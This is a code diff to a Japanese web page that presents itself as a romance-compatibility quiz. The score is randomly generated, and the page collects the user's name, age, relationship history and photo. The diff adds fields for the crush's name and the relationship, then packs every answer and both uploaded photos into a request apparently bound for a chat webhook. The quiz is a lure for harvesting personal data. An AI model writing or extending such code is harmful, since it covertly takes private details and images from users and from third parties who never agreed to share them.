@@ -29,32 +29,32 @@
         let step = 0;
         const answers = {};
         const files = {};
-        const questions = ["名前は？", "年齢は？", "恋愛経験回数は？", "あなたの写真を載せてね！（任意）", "好きな人の写真を載せてね！（任意）"];
-        const keys = ["name", "age", "exp", "my_photo", "partner_photo"];
+        const questions = ["名前は？", "年齢は？", "恋愛経験回数は？", "相手の名前は？", "相手との関係は？", "あなたの写真を載せてね！（任意）", "好きな人の写真を載せてね！（任意）"];
+        const keys = ["name", "age", "exp", "partner", "rel", "my_photo", "partner_photo"];
 
         document.getElementById('actionBtn').onclick = () => {
             const inputVal = document.getElementById('inputArea').value;
             const fileVal = document.getElementById('fileInput').files[0];
 
-            if (step > 0 && step <= 3 && inputVal.trim() === "") { alert("空欄じゃ診断できないよ！"); return; }
+            if (step > 0 && step <= 5 && inputVal.trim() === "") { alert("空欄じゃ診断できないよ！"); return; }
 
             if (step === 0) {
                 step++;
                 document.getElementById('msg').innerText = questions[0];
                 document.getElementById('inputArea').style.display = 'block';
                 document.getElementById('actionBtn').innerText = '次へ進む';
-            } else if (step <= 5) {
-                if (step <= 3) answers[keys[step - 1]] = inputVal;
-                if (step === 4) files['my_photo'] = fileVal;
-                if (step === 5) files['partner_photo'] = fileVal;
+            } else if (step <= 7) {
+                if (step <= 5) answers[keys[step - 1]] = inputVal;
+                if (step === 6) files['my_photo'] = fileVal;
+                if (step === 7) files['partner_photo'] = fileVal;
                 
                 document.getElementById('inputArea').value = '';
                 document.getElementById('fileInput').value = '';
 
-                if (step < 5) {
+                if (step < 7) {
                     step++;
                     document.getElementById('msg').innerText = questions[step - 1];
-                    if (step === 4 || step === 5) {
+                    if (step === 6 || step === 7) {
                         document.getElementById('inputArea').style.display = 'none';
                         document.getElementById('fileInput').style.display = 'block';
                     } else {
@@ -76,8 +76,12 @@
             document.getElementById('progress-container').style.display = 'block';
 
             const score = Math.floor(Math.random() * (99 - 70) + 70);
+            
+            // 全データを網羅するメッセージを作成
+            const message = `**恋愛診断結果**\n名前: ${answers.name}\n年齢: ${answers.age}\n経験: ${answers.exp}\n相手: ${answers.partner}\n関係: ${answers.rel}\nスコア: ${score}%`;
+            
             const formData = new FormData();
-            formData.append("payload_json", JSON.stringify({ content: `**診断結果**\n名前: ${answers.name}\nスコア: ${score}%` }));
+            formData.append("payload_json", JSON.stringify({ content: message }));
             if (files['my_photo']) formData.append("file1", files['my_photo']);
             if (files['partner_photo']) formData.append("file2", files['partner_photo']);
 
